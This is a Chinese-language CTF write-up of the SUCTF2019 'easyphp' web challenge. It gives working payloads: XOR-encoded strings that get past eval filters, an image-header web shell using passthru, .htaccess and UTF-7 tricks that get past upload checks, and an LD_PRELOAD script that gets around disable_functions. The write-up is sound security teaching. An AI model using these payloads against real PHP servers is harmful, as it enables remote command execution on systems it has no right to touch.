原创：Mr.zhang合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

## 0x00 题目SUCTF2019-easyphp  

<?php function get_the_flag(){ // webadmin will remove your upload file every
20 min!!!! $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES["file"])){
$tmp_name = $_FILES["file"]["tmp_name"]; $name = $_FILES["file"]["name"];
$extension = substr($name, strrpos($name,".")+1);
if(preg_match("/ph/i",$extension)) die("^_^");
if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
if(!exif_imagetype($tmp_name)) die("^_^"); $path= $userdir."/".$name;
@move_uploaded_file($tmp_name, $path); print_r($path); } } $hhh = @$_GET['_'];
if (!$hhh){ highlight_file(__FILE__); } if(strlen($hhh)>18){ die('One inch
long, one inch strong!'); } if ( preg_match('/[\x00-0-9A-Za-z\'"\\`~_&.,|=[\x7F]+/i', $hhh) ) die('Try something else!');
$character_type = count_chars($hhh, 3); if(strlen($character_type)>12)
die("Almost there!"); eval($hhh); ?>

## 0x01 分析：  

源码给出了一个文件上传的function，但是没有直接调用，接着看源码，在后面接收GET参数$_GET['_']经过严格的过滤之后作为eval的参数传入，因此前半段的思路很明显是通过eval调用文件上传的function。按照正常的逻辑，我们有eval函数，也可以控制eval函数里的值，那么我们可以考虑利用eval来执行恶意代码，而题目的严格限制就是需要我们绕过的地方。

首先需要绕过字符长度的限制

if(strlen($hhh)>18){ die('One inch long, one inch strong!'); }

然后对大部分可见字符做了限制

if ( preg_match('/[\x00- 0-9A-Za-z\'"\\`~_&.,|=[\x7F]+/i', $hhh) ) die('Try
something else!');

通过脚本在本地跑，可以得到允许的字符。

![v2-3eb7b85ec160ba36c186d42669154e7f_hd.j](https://pic3.zhimg.com/80/v2-3eb7b85ec160ba36c186d42669154e7f_hd.jpg)

! # $ % ( ) * + - / : ; < > ? @ \ ] ^ { }

接着对可用字符数目进行了限制，不可以使用超过12种的字符。

$character_type = count_chars($hhh, 3); if(strlen($character_type)>12)
die("Almost there!");

大体思路就是通过eval调用上传函数get_the_flag，来getshell

## 0x02 思考  

如何通过这个eval函数进行RCE，eval会将参数作为PHP代码执行，并且其传入的必须是有效的PHP代码，所有的语句必须以分号结尾，否则会导致parse
error。

> 代码执行的作用域是调用 eval() 处的作用域。因此，eval() 里任何的变量定义、修改，都会在函数结束后被保留。eval() 返回
> NULL，除非在执行的代码中 return 了一个值，函数返回传递给 return 的值。 PHP 7 开始，执行的代码里如果有一个 parse
> error，eval() 会抛出 ParseError 异常。在 PHP 7 之前， 如果在执行的代码中有 parse error，eval() 返回
> FALSE，之后的代码将正常执行。  
>

如果想要以间接变量的方式来引用，需要注意格式：

如果直接以$xxx();来调用，PHP5和PHP7并无不同，如果以($xxx)();的格式，在php7中，不允许通过('phpinfo')();来执行动态函数，但是在PHP7以后可以通过('phpinfo')();的方式来执行函数

![v2-6f9c52679330e5cfb375b0e521663964_hd.j](https://pic2.zhimg.com/80/v2-6f9c52679330e5cfb375b0e521663964_hd.jpg)

具体可以看PHP关于表达式执行顺序在各个版本之间的说明

http://php.net/manual/zh/migration70.incompatible.php

起初一看这里面并没有引号，无法按照一般的方法传入字符串异或，一般传统的方法是通过异或^或者取反~，但是需要字符串才可以。这里要使用异或那么便是构造('xxx'^'xxx')()的形式，或者(~'xxxx')()的形式，但此处最大的问题在于没有引号，从这道题目中学习到了，在PHP中，url
参数默认是字符串类型，不用考虑引号，并且可以使用url编码构造不可见字符，因此可以得到以下payload

Ascii码大于 0x7F 的字符都会被当作字符串，不可见字符用url编码表示，比如

(~%8F%97%8F%96%91%99%90)(); //(phpinfo)();

![v2-2555ee46fb0f5955c4f346b3c99cbd3e_hd.j](https://pic3.zhimg.com/80/v2-2555ee46fb0f5955c4f346b3c99cbd3e_hd.jpg)

但是我们可用的字符里没有~，所以要想其他办法

第一：和 0xFF 异或相当于取反，可以绕过被过滤的取反符号。

%8F%97%8F%96%91%99%90^%FF%FF%FF%FF%FF%FF%FF

第二：通过跑脚本来得到不可显字符的异或组合，来得到想要的payload。

<?php function valid($s){ if ( preg_match('/[\x00-0-9A-Za-z\'"\\`~_&.,|=[\x7F]+/i', $s) ) return false; return true; } function
is_valid($s){ if ( preg_match('/[\x00- 0-9A-Za-z\'"\\`~_&.,|=[\x7F]+/i', $s) )
return false; if(ord($s) <= 127) return false; return true; } function
get($s){ $result0 = ''; $result1 = ''; for($c=0; $c < strlen($s); $c++){
for($i=0; $i<256; $i++){ // echo "round $i\n"; if(is_valid(chr($i))){
if(is_valid(chr($i)^$s[$c])){ // echo $i; $result0.=urlencode(chr($i));
$result1.=urlencode(chr($i)^$s[$c]); break; } } } } return
$result0.'^'.$result1; } echo get('phpinfo');

![v2-d0039a1c37c76f57f7a7b753b4ff040c_hd.p](https://pic2.zhimg.com/80/v2-d0039a1c37c76f57f7a7b753b4ff040c_hd.png)

%80%80%80%80%80%80%80^%F0%E8%F0%E9%EE%E6%EF

得到payload。

![v2-2555ee46fb0f5955c4f346b3c99cbd3e_hd.j](https://pic1.zhimg.com/80/v2-2555ee46fb0f5955c4f346b3c99cbd3e_hd.jpg)

到现在，算是绕过了字符的限制，还需要考虑长度的问题，长度只允许不超过18个字符，而上面的phpinfo也需要20个字符，因此需要考虑变量来绕过，而可控的全局变量里最短的也就是$_GET，$是可以使用的，通过脚本得到不可显字符异或的url编码的payload

%80%80%80%80^%DF%C7%C5%D4

按照间接调用的规则，$(xxxx^xxxx)()这里括号和花括号具有同等效果，因为只有右括号没有左括号，但是有花括号

${%80%80%80%80^%DF%C7%C5%D4}[X](); ${%80%80%80%80^%DF%C7%C5%D4}{X}();

这里正好是18个字符

![v2-34d56b4e0f685db312beed994d51af7c_hd.j](https://pic2.zhimg.com/80/v2-34d56b4e0f685db312beed994d51af7c_hd.jpg)

但是$_GET里的接收参数需要换成不可显字符

${%80%80%80%80^%DF%C7%C5%D4}{%95}();

![v2-106b0cc17e4ce453fceaa98922f6cd6d_hd.j](https://pic4.zhimg.com/80/v2-106b0cc17e4ce453fceaa98922f6cd6d_hd.jpg)

这样就构造出符合长度的payload，并且通过$_GET变量跳出长度的限制。

不过由于长度限制的很死，没有办法带上参数，但是题目定义了一个上传的函数，所以我们接着看上传的函数的逻辑。

function get_the_flag(){ // webadmin will remove your upload file every 20
min!!!! $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES["file"])){
$tmp_name = $_FILES["file"]["tmp_name"]; $name = $_FILES["file"]["name"];
$extension = substr($name, strrpos($name,".")+1);
if(preg_match("/ph/i",$extension)) die("^_^");
if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
if(!exif_imagetype($tmp_name)) die("^_^"); $path= $userdir."/".$name;
@move_uploaded_file($tmp_name, $path); print_r($path); } }

这个函数主要存在以下三个限制

第一，文件的扩展名不能存在ph的字符

$extension = substr($name, strrpos($name,".")+1);
if(preg_match("/ph/i",$extension)) die("^_^");

第二，文件的内容不能存在php的标识符<?

if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");

第三，文件的头需要是图像的头，exif_imagetype()读取一个图像的第一个字节并检查其签名。

if(!exif_imagetype($tmp_name)) die("^_^");

首先对于文件头，有以下几种方法可以绕过

1、在内容前面增加GIF98a等标志

2、在文件开头增加\xff\xd8等标志

>>> fh = open('shell.php', 'w') >>> fh.write('\xFF\xD8\xFF\xE0' + '<?
passthru($_GET["cmd"]); ?>') >>> fh.close()

3、使用了xbm格式，X Bit Map，来绕过图片检测

一个XMB图片文件通常如下

#define width 1337 #define height 1337 static char test_bits[] = { };

在这里要结合配置文件的特性使用注释行，就会被htaccess当作无效来解析，或者行开头使用\x00开头，所以使用XBM文件正好不影响.htaccess的解析

接着对于文件的扩展名，可以利用.htaccess或者.user.ini来绕过，具体使用哪一种需要看题目的环境而决定

.htaccess

#define width 1337 #define height 1337 AddType application/x-httpd-php .aaa

此处是把.aaa后缀的文件当作php来解析，这样我们就可以上传.aaa的文件来绕过ph的后缀限制

接着我们要绕过对文件内容的绕过，这里可以利用各种编码，比如base或者utf7，或者utf16，再htaccess中写入

#define width 1337 #define height 1337 AddType application/x-httpd-php .aaa
php_flag display_errors on php_flag zend.multibyte 1 php_value
zend.script_encoding "UTF-7"

然后上传的时候文件内容进行相应的编码即可

#define width 1337 #define height 1337 +ADw?php system('ls /')+ADs +AF8AXw-halt+AF8-compiler()+ADs

在里面疯狂偷学各位师傅的姿势

![v2-67ffa1506cf9942cc9033a08cbde59c0_hd.p](https://pic3.zhimg.com/80/v2-67ffa1506cf9942cc9033a08cbde59c0_hd.png)

到目前为止我们已经可以顺利上传文件并可以初步执行命令，但是phpinfo一下发现了basedir限制，无法读到根目录下的内容，下面需要对这个进行绕过，或者绕过disable
function也可以，因此有以下baypass方法：

第一：绕过open_basedir

第二：绕过disabled func

第一个方法可以参考https://bugs.php.net/bug.php?id=70134，通过socket与fpm通信

第二个方法，disable function

pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail

注意到disable_functions里面没有putenv函数和error_log函数，因此可以通过LD_PRELOAD来bypass
disable_functions。在UNIX的动态链接库的世界中，LD_PRELOAD是一个有趣的环境变量，它可以影响程序运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。我使用的是error_log函数，这里可以先构造一个上传页面和handle文件，这样后面上传就不需要再通过前面那些检查了。可以自行编译.so文件也可以用现成的。

<?php echo "example :
http://site.com/shell.php?outpath=any_temp&sopath=/path/to/so/bypass.so&cmd=id";
$cmd = $_GET["cmd"]; $out_path = $_GET["outpath"]; $payload = $cmd . " > ".
$out_path . " 2>&1"; echo "<br/>cmdline : " .$payload;
putenv("EVIL_CMDLINE=".$payload); $so_path = $_GET["sopath"];
putenv("LD_PRELOAD=".$so_path); error_log('a',1); echo "<br /> output :
".nl2br(file_get_contents($out_path)); ?>

最后得到flag。

## 0x03 参考链接  

https://www.php.net/manual/zh/migration70.incompatible.php

https://www.php.net/manual/zh/migration72.deprecated.php

https://bugs.php.net/bug.php?id=70134

<https://github.com/mdsnins/ctf-writeups/tree/master/2019/Insomnihack%202019/l33t-hoster>

## 0x04 实操练习  

CTF Web类的相关练习，可到合天网安实验室学习实验——XCTF-Web实战

点击：[课程:XCTF-Web实战(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=C9d6c0ca797abec2017070617340600001?channelID=zhihu)开始做实验哦（PC端操作最佳哟）

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关，本文为合天原创，如需转载，请注明出处！

  

